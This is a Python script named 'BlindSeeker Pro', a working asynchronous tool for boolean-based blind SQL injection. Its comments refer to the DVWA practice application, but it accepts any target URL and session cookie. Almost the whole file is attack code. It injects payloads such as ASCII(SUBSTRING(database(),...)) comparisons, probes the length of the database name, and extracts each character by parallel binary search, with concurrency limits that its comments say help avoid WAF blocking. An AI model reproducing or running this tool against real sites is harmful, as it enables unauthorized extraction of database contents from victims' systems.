import asyncio
import aiohttp
import argparse
import logging
import time
import sys
from abc import ABC, abstractmethod
from typing import Optional, List, Dict
from urllib.parse import urlparse

# ==========================================
# CONFIGURATION & LOGGING
# ==========================================
# Configure logging with timestamp and log level
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("BlindSeeker")

# ==========================================
# DESIGN PATTERN: STRATEGY
# ==========================================
class InjectionStrategy(ABC):
    """
    Abstract Base Class (Blueprint) for injection strategies.
    This allows for easy extension to support other injection types 
    (e.g., Time-based, Error-based) without modifying the core logic.
    """
    @abstractmethod
    async def is_truthy(self, session: aiohttp.ClientSession, payload: str) -> bool:
        pass

class BooleanBasedStrategy(InjectionStrategy):
    """
    Concrete strategy for Boolean-based Blind SQL Injection.
    Determines truth based on the presence of a specific string in the response.
    """
    def __init__(self, url: str, success_indicator: str):
        self.url = url
        self.success_indicator = success_indicator

    async def is_truthy(self, session: aiohttp.ClientSession, payload: str) -> bool:
        # DVWA requires the 'Submit' parameter to process the request
        params = {'id': payload, 'Submit': 'Submit'}
        try:
            async with session.get(self.url, params=params) as response:
                text = await response.text()
                # Return True if the success indicator is found in the response body
                return self.success_indicator in text
        except Exception as e:
            logger.error(f"Request failed: {e}")
            return False

# ==========================================
# CORE ENGINE (ASYNCIO)
# ==========================================
class BlindSQLExploiter:
    def __init__(self, strategy: InjectionStrategy, cookie_str: str, max_concurrency: int = 20):
        self.strategy = strategy
        self.cookies = self._parse_cookies(cookie_str)
        # Semaphore controls the concurrency limit to prevent DoS or WAF blocking
        self.semaphore = asyncio.Semaphore(max_concurrency) 
        self.results: Dict[int, str] = {} # Stores extracted characters: {position: char}

    def _parse_cookies(self, cookie_str: str) -> Dict[str, str]:
        """Parses the raw cookie string into a dictionary."""
        cookies = {}
        if not cookie_str:
            return cookies
        for item in cookie_str.split(';'):
            if '=' in item:
                k, v = item.strip().split('=', 1)
                cookies[k] = v
        return cookies

    async def _binary_search_char(self, session: aiohttp.ClientSession, position: int):
        """
        Performs an asynchronous Binary Search to find a character at a specific position.
        Algorithm Complexity: O(log n) per character.
        """
        async with self.semaphore: # Acquire lock to respect concurrency limit
            low, high = 32, 126 # Printable ASCII range
            
            while low <= high:
                mid = (low + high) // 2
                
                # Base case: Found the character
                if low == high:
                    self.results[position] = chr(low)
                    # Print progress in-line
                    sys.stdout.write(f"\r[+] Progress: Found char at pos {position}: {chr(low)}")
                    sys.stdout.flush()
                    return

                # Payload Logic: ASCII(SUBSTRING(database(),pos,1)) > mid
                payload = f"1' AND ASCII(SUBSTRING(database(),{position},1)) > {mid} #"
                
                # Delegate the truth check to the injected strategy
                is_true = await self.strategy.is_truthy(session, payload)

                if is_true:
                    low = mid + 1
                else:
                    high = mid

    async def exploit(self):
        """
        Main execution routine to orchestrate the attack.
        """
        logger.info("Engine Started. Initializing Async Session...")
        
        async with aiohttp.ClientSession(cookies=self.cookies) as session:
            # 1. Determine Database Length (Linear check for reliability)
            logger.info("Determining database length...")
            length = await self._find_length(session)
            if not length:
                logger.error("❌ Could not determine database length.")
                return

            logger.info(f"Database length found: {length}")
            logger.info(" Starting parallel extraction...")

            # 2. Create extraction tasks for all positions simultaneously
            start_time = time.time()
            tasks = [self._binary_search_char(session, pos) for pos in range(1, length + 1)]
            
            # 3. Execute all tasks in parallel
            await asyncio.gather(*tasks)
            
            duration = time.time() - start_time
            
            # 4. Aggregate and display results
            final_name = "".join([self.results[i] for i in sorted(self.results.keys())])
            print(f"\n\n{'-'*40}")
            print(f"🎉 EXTRACTION COMPLETE")
            print(f"{'-'*40}\n")
            print(f"📂 Database Name: {final_name}")
            print(f"⏱️ Time Taken:    {duration:.4f} seconds")
            print(f"⚡ Throughput:     {len(tasks) * 7 / duration:.2f} req/sec (approx)")

    async def _find_length(self, session: aiohttp.ClientSession) -> Optional[int]:
        """Finds the length of the database name using linear search."""
        for i in range(1, 50):
            payload = f"1' AND LENGTH(database()) = {i} #"
            if await self.strategy.is_truthy(session, payload):
                return i
        return None

# ==========================================
# ENTRY POINT
# ==========================================
def main():
    parser = argparse.ArgumentParser(description="BlindSeeker Pro - Enterprise Grade SQLi Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--cookie", required=True, help="Session Cookie String")
    parser.add_argument("-s", "--success", default="User ID exists", help="Success indicator string")
    parser.add_argument("-t", "--concurrency", type=int, default=20, help="Max concurrent requests")
    
    args = parser.parse_args()

    # Initialize Strategy (Dependency Injection)
    strategy = BooleanBasedStrategy(args.url, args.success)
    
    # Initialize Engine
    engine = BlindSQLExploiter(strategy, args.cookie, args.concurrency)
    
    # Run the Async Event Loop
    try:
        asyncio.run(engine.exploit())
    except KeyboardInterrupt:
        logger.warning("\n🛑 Attack interrupted by user.")

if __name__ == "__main__":
    main()